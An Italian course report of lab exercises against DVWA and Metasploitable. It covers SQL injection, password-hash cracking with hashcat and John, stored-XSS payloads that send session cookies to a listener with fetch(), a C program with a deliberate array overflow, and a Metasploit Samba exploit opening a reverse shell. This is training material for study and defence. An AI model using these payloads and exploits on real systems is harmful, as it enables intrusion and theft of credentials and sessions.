# 🌐 S8 Build Week 2: **REPORT OPERATIVO – CYBERCERBERUS**

---
---

# 🛠 **TRACCIA GIORNO 1: SQL Injection su DVWA (Low e Medium)**

Questa guida fornisce istruzioni passo-passo per eseguire una SQL Injection sulla piattaforma **DVWA (Damn Vulnerable Web Application)**. L'obiettivo è estrarre i dati sensibili dell'utente **Pablo** in modalità **Low** e **Medium**, e decifrare la sua password hash **MD5**.

## **Requisiti**

1. **DVWA Configurato**: Assicurati che la piattaforma DVWA sia correttamente installata e configurata.
2. **Accesso a un Browser o Terminale** per inviare richieste SQL Injection.
3. **Livelli di Sicurezza** configurati in DVWA:
   - **Low** per la prima parte.
   - **Medium** per la seconda parte.

---

## 🔍 **Parte 1: SQL Injection in Modalità Low**

### 🎯 **Obiettivo**
Estrarre i dati dell'utente **Pablo**, inclusa la sua password hash MD5.

![PabloLow](./Screenshots/EstraggoPablo.png)

### 📝 **Passaggi**

1. **Vai alla pagina di SQL Injection**:
   - URL: `http://<IP_DVWA>/dvwa/vulnerabilities/sqli/`

2. **Trova i dati dell'utente Pablo**:
   Inserisci il seguente payload nel campo **User ID**:
   ```sql
   ' UNION SELECT user, password FROM dvwa.users WHERE user='Pablo' -- 
   ```

3. **Risultati attesi**:
   - Nome utente: `Pablo`
   - Password hash: `0d107d09f5bbe40cade3de5c71e9e9b7`

4. **Decifra la password hash**:
   - L'hash `0d107d09f5bbe40cade3de5c71e9e9b7` corrisponde alla password `letmein`.
   - Puoi utilizzare uno strumento online come [https://crackstation.net](https://crackstation.net) per decifrare l'hash.

---

## 🔍 **Parte 2: SQL Injection in Modalità Medium**

### 🎯 **Obiettivo**
Superare i controlli di filtraggio e ottenere i dati di Pablo utilizzando payload in formato hexadecimal.

![SQLMedium](./Screenshots/SQLmedium.png)

### 📝 **Passaggi**

1. **Vai alla pagina di SQL Injection**:
   - URL: `http://<IP_DVWA>/dvwa/vulnerabilities/sqli/`

2. **Trova i dati di Pablo**:
   Usa il seguente payload nel campo **User ID**:
   ```sql
   0x27 UNION SELECT user, password FROM dvwa.users WHERE user=0x5061626c6f -- 
   ```
![PabloMedium](./Screenshots/EstraggoPabloMedium.png)

   - `0x27` è il formato hexadecimal per l'apostrofo (`'`).
   - `0x5061626c6f` è il formato hexadecimal per `Pablo`.

3. **Risultati attesi**:
   - Nome utente: `Pablo`
   - Password hash: `0d107d09f5bbe40cade3de5c71e9e9b7`

4. **Decifra la password hash**:
   - Decifra l'hash `0d107d09f5bbe40cade3de5c71e9e9b7` utilizzando uno strumento come [Crackstation](https://crackstation.net) per ottenere la password: `letmein`.

---

## 🛠 **Strumenti Utili**

1. **Siti per decifrare hash MD5**:
   - [Crackstation](https://crackstation.net)
   - [MD5 Decrypt](https://md5decrypt.net)

2. **Tool di cracking**:
   - **Hashcat**:
     ```bash
     hashcat -a 0 -m 0 hash.txt wordlist.txt
     ```
   - **John the Ripper**:
     ```bash
     john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
     ```
![John](./Screenshots/JohnMD5crack.png)

---

## **Conclusione**

Seguendo questa guida, abbiamo dimostrato come eseguire una SQL Injection su DVWA per estrarre i dati dell'utente **Pablo** e decifrare la sua password MD5 `letmein`. Questi test sottolineano l'importanza di proteggere le applicazioni web da vulnerabilità di SQL Injection.

---
---

# 🛡 **TRACCIA GIORNO 2: Exploit XSS Persistente su DVWA (Low e Medium)**

Questa guida illustra come sfruttare una vulnerabilità di **Cross-Site Scripting (XSS) Persistente** sulla piattaforma **DVWA (Damn Vulnerable Web Application)** in modalità **Low** e **Medium**. L'obiettivo è simulare il furto di cookie di sessione inviandoli a un server sotto il nostro controllo.

## **Requisiti**

1. **DVWA Installato** e configurato.
2. **Livelli di Sicurezza** impostati su **Low** e **Medium**.
3. **Server di Ascolto** su Kali Linux configurato per ricevere i cookie sulla porta **4444**.
4. Indirizzi IP:
   - **Kali Linux**: `192.168.50.165`
   - **Metasploitable**: `192.168.50.3`

---

## 🔍 **Parte 1: XSS Persistente in Modalità Low**

### 🎯 **Obiettivo**
Iniettare uno script malevolo nella web application DVWA per inviare i cookie della sessione al nostro server di ascolto.

### 📝 **Passaggi**

1. **Configura il Server di Ascolto su Kali Linux**:
   - Avvia Netcat per ricevere i cookie sulla porta 4444:
     ```bash
     nc -lvnp 4444
     ```

2. **Accedi a DVWA**:
   - Vai alla sezione **XSS Persistente**:
     ```
     http://192.168.50.3/dvwa/vulnerabilities/xss_r/
     ```

3. **Inserisci il Payload**:
   Usa il seguente script JavaScript nel campo vulnerabile (esempio: un campo commento):
   ```html
   <script>
     fetch('http://192.168.50.165:4444', {
       method: 'POST',
       body: document.cookie
     });
   </script>
   ```

4. **Esegui il Payload**:
   - Invia il payload premendo **Submit**.
   - Ogni volta che la pagina viene caricata, lo script invierà i cookie della sessione al server di ascolto.

5. **Verifica i Cookie su Kali Linux**:
   - Sul terminale di Kali Linux, dovresti vedere i cookie della sessione, ad esempio:
     ```
     PHPSESSID=abcdef1234567890; security=low
     ```
![XSSLow](./Screenshots/XSSLow.png)

---

## 🔍 **Parte 2: XSS Persistente in Modalità Medium**

### 🎯 **Obiettivo**
Aggirare i filtri di input e sfruttare la vulnerabilità XSS per ottenere i cookie della sessione.

### 📝 **Passaggi**

1. **Configura il Server di Ascolto su Kali Linux**:
   - Utilizza lo stesso comando di Netcat:
     ```bash
     nc -lvnp 4444
     ```

2. **Accedi a DVWA**:
   - Vai alla sezione **XSS Persistente**:
     ```
     http://192.168.50.3/dvwa/vulnerabilities/xss_r/
     ```

3. **Inserisci il Payload Alternativo**:
   Poiché `<script>` potrebbe essere filtrato, utilizza il seguente payload:
   ```html
   <img src="nonexistent.jpg" onerror="fetch('http://192.168.50.165:4444', {method: 'POST', body: document.cookie})">
   ```

4. **Esegui il Payload**:
   - Invia il payload premendo **Submit**.
   - Ogni volta che un utente carica la pagina, l'evento `onerror` si attiverà e invierà i cookie al server di ascolto.

5. **Verifica i Cookie su Kali Linux**:
   - Controlla il terminale e verifica i cookie ricevuti:
     ```
     PHPSESSID=abcdef1234567890; security=medium
     ```

![XSSMedium](./Screenshots/XSSMedium.png)

---

## 📌 **Spiegazione dei Payload**

### **Payload in Modalità Low**
- `<script>`: Inietta uno script JavaScript nella pagina vulnerabile.
- `document.cookie`: Recupera i cookie della sessione della vittima.
- `fetch`: Invia i cookie al server dell'attaccante tramite una richiesta HTTP POST.

### **Payload in Modalità Medium**
- `<img src="nonexistent.jpg">`: Un'immagine che non esiste attiva l'evento `onerror`.
- `onerror`: Contiene lo script malevolo per inviare i cookie.
- `fetch`: Come sopra, invia i cookie al server.

---

## 🛡 **Considerazioni di Sicurezza**

Per proteggere le applicazioni da attacchi XSS:

1. **Sanitizzazione dell'Input**:
   - Filtra e valida tutti i dati forniti dagli utenti per evitare l'iniezione di codice malevolo.
2. **Cookie HTTPOnly**:
   - Imposta i cookie di sessione come **HTTPOnly** per impedire l'accesso tramite JavaScript.
3. **Content Security Policy (CSP)**:
   - Configura una CSP per limitare l'esecuzione di script non autorizzati.

---

## 🚀 **Conclusione**

Abbiamo dimostrato come sfruttare vulnerabilità di **SQL Injection** e **XSS Persistente** su DVWA per estrarre dati sensibili e rubare cookie di sessione. Questa guida sottolinea l'importanza di implementare misure di sicurezza per prevenire tali attacchi.

Se hai bisogno di ulteriori chiarimenti o supporto, non esitare a contattarci! 🚀

---
---

# **🛠 TRACCIA GIORNO 3: Programma in C**


## **Descrizione del funzionamento originale**

💻 Il programma originale in linguaggio C permette di eseguire queste semplici operazioni:

1️⃣ **Inserire 10 numeri interi**:
   - L'utente inserisce 10 numeri che vengono salvati in un array chiamato `vector`.

2️⃣ **Visualizzare i numeri inseriti**:
   - Dopo l'inserimento, il programma mostra i numeri forniti dall'utente.

3️⃣ **Ordinare i numeri**:
   - I numeri vengono ordinati in ordine crescente con un algoritmo chiamato **Bubble Sort**.

4️⃣ **Visualizzare i numeri ordinati**:
   - Alla fine, il programma mostra i numeri in ordine crescente.

### **Come funziona?**
1. 📝 Crea uno spazio (array) per 10 numeri.
2. 🎤 Chiede all'utente di inserire 10 numeri.
3. 👀 Mostra i numeri inseriti.
4. 🔄 Li ordina dal più piccolo al più grande.
5. ✅ Mostra i numeri ordinati.

### **Esempio di risultato originale**
```
Inserire 10 numeri interi:
[1]: 5
[2]: 3
[3]: 7
[4]: 9
[5]: 2
[6]: 8
[7]: 4
[8]: 1
[9]: 6
[10]: 10

Il vettore inserito è:
[1]: 5
[2]: 3
[3]: 7
...

Il vettore ordinato è:
[1]: 1
[2]: 2
[3]: 3
...
```

---

## **Modifiche apportate al programma**

✨ Abbiamo migliorato il programma per offrire due modalità:

1️⃣ **Modalità classica**:
   - Funziona esattamente come l'originale: inserisci 10 numeri, li ordina e li mostra.

2️⃣ **Modalità con errore simulato**:
   - Ti permette di inserire 15 numeri, andando oltre i limiti del programma e simulando un **errore di Buffer Overflow**.
   - Prima del crash, viene mostrato un messaggio di errore personalizzato: **"Buffer Overflow Rilevato"**. ⚠️

---

## **Come lo abbiamo migliorato?**

### **1. Aggiunto un menù interattivo**
🛠️ L'utente può scegliere tra:
   - **Opzione 1:** Modalità classica.
   - **Opzione 2:** Simulazione di errore.

### **2. Controlli per l'input**
🔒 Abbiamo aggiunto controlli per evitare selezioni errate:
```c
if (scanf("%d", &scelta) != 1 || (scelta != 1 && scelta != 2)) {
    printf("Errore: Selezione non valida. Inserire 1 o 2.\n");
    return 1;
}
```

### **3. Simulazione dell'errore**
💥 Il programma ora permette di andare oltre i limiti dell'array, simulando un errore critico:
```c
for (i = 0; i < 15; i++) {
    if (i >= 10) {
        printf("\n[!] ERRORE CRITICO: BUFFER OVERFLOW RILEVATO! (Scrittura oltre i limiti)\n");
    }
    scanf("%d", &vector[i]);
}
```

### **4. Mantenuta la modalità originale**
✅ La funzionalità originale è stata conservata, compreso l'ordinamento Bubble Sort.

---

## **Come eseguire il programma?**

1. 🔧 Compila il programma usando GCC:
   ```bash
   gcc programma.c -o programma
   ```
2. ▶️ Esegui il programma:
   ```bash
   ./programma
   ```
3. Scegli una modalità dal menù:
   - **1:** Modalità classica.
   - **2:** Simulazione di errore.

---

## **Esempi di output**

### **Modalità classica**
```
Hai selezionato il programma corretto.
Inserire 10 numeri interi:
[1]: 5
[2]: 3
...

Il vettore inserito è:
[1]: 5
[2]: 3
...

Il vettore ordinato è:
[1]: 3
[2]: 5
...
```

### **Modalità con errore**
```
Hai selezionato il programma con errore (buffer overflow).
Inserire 15 numeri interi:
[1]: 5
[2]: 3
[3]: 7
...

[11]:
[!] ERRORE CRITICO: BUFFER OVERFLOW RILEVATO! (Scrittura oltre i limiti)
Segmentation fault (core dumped)
```

---

## **Conclusioni**

💡 Con queste modifiche, il programma dimostra sia il comportamento corretto che una simulazione di errore di Buffer Overflow. Questo lo rende utile per chi vuole comprendere meglio i concetti di sicurezza e debugging in C.

---
---

# 🛡️ TRACCIA GIORNO 4: Sfruttamento di Vulnerabilità sulla Macchina Metasploitable

## 📋 Descrizione
Sulla macchina **Metasploitable** sono stati individuati diversi servizi in ascolto potenzialmente vulnerabili. Lo scopo di questa traccia è:
1. 🖥️ Effettuare una scansione delle vulnerabilità con **Nessus**.
2. ⚙️ Sfruttare la vulnerabilità del servizio Samba attivo sulla porta **445 TCP** utilizzando **Metasploit**.
3. ✅ Verificare l'accesso alla macchina compromessa eseguendo il comando `ifconfig` per ottenere l'indirizzo IP della macchina vittima.

---

## 🔧 Requisiti
- **IP Kali Linux**: `192.168.50.165`
- **IP Metasploitable**: `192.168.50.3`
- **Porta di ascolto del payload**: `5555`
- **Tool utilizzati**: Nessus, MSFConsole (Metasploit)

---

## 🛠️ Passaggi Eseguiti

### 1. 🔍 Scansione delle Vulnerabilità con Nessus
1. **Avvio del servizio Nessus**:
   ```bash
   sudo systemctl start nessusd
   ```
2. **Accesso all'interfaccia web**:
   - URL: `https://localhost:8834`.
   - Completata la configurazione iniziale e aggiornato Nessus.
3. **Creazione della scansione**:
   - Tipo: **Basic Network Scan**.
   - Target: `192.168.50.3` (IP di Metasploitable).
4. **Esecuzione dello scan**:
   - La scansione ha identificato una vulnerabilità critica sul servizio Samba in ascolto sulla porta **445 TCP**.
5. **Report allegato**:
   - I dettagli della scansione sono disponibili nel file `nessus_scan_report.html`.

---

### 2. 💻 Attacco alla Macchina Metasploitable con Metasploit
1. **Avvio di MSFConsole**:
   ```bash
   msfconsole
   ```
2. **Ricerca dell'exploit appropriato**:
   - Comando:
     ```bash
     search samba
     ```
   - Trovato: **exploit/multi/samba/usermap_script** (indice: 15).
   - ![Screenshot della ricerca](./Screenshots/SearchSambaMetaspl.png)
3. **Selezione dell'exploit**:
   - Comando:
     ```bash
     use 15
     ```
   - ![Screenshot della selezione dell'exploit](./Screenshots/SambaUse15.png)
4. **Configurazione dei parametri dell'exploit**:
   - Impostazione dell'IP della macchina vittima:
     ```bash
     set RHOSTS 192.168.50.3
     ```
   - Impostazione della porta del servizio Samba:
     ```bash
     set RPORT 445
     ```
   - Configurazione del payload:
     ```bash
     set payload cmd/unix/reverse
     ```
   - Impostazione dell'IP e della porta di ascolto di Kali Linux:
     ```bash
     set LHOST 192.168.50.165
     set LPORT 5555
     ```
5. **Esecuzione dell'exploit**:
   - Comando:
     ```bash
     exploit
     ```
   - L'exploit ha avuto successo, fornendo una shell sulla macchina vittima.
   - ![Screenshot del Meterpreter attivo](./Screenshots/MeterpreterSambaMetaspl.png)

---

### 3. 📡 Verifica dell'Accesso alla Macchina Compromessa
1. **Comando eseguito**:
   Una volta ottenuta la shell sulla macchina Metasploitable, è stato eseguito il comando:
   ```bash
   ifconfig
   ```
2. **Risultato**:
   - Confermato l'indirizzo IP della macchina vittima: `192.168.50.3`.

---

## ✅ Conclusioni
- 🔎 Il **Vulnerability Scanning** ha evidenziato una vulnerabilità critica nel servizio Samba sulla porta **445 TCP**.
- 💥 La vulnerabilità è stata sfruttata con successo utilizzando l'exploit **exploit/multi/samba/usermap_script** di Metasploit.
- 🖥️ È stato ottenuto accesso alla macchina compromessa e confermato l'indirizzo IP tramite il comando `ifconfig`.

---
---

